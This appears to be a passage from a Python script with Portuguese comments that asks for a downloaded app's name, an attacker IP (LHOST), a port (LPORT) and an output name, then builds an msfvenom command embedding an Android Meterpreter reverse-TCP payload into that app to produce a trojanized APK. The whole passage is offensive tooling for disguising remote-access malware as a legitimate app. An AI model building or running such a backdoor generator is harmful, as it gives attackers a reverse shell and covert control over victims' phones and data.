...
# Pergunta ao usuário o nome do aplicativo baixado, o endereço IP, a porta e o nome do arquivo de saída desejados
nome_aplicativo_baixado = input("NAME APP DOWNLOADED: ")
lhost = input("IP (LHOST): ")
lport = input("(LPORT): ")
nome_arquivo_saida = input("FINAL APP NAME: ")

# Constrói o comando msfvenom
comando = f"msfvenom -x '{nome_aplicativo_baixado}' -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {nome_arquivo_saida}.apk"
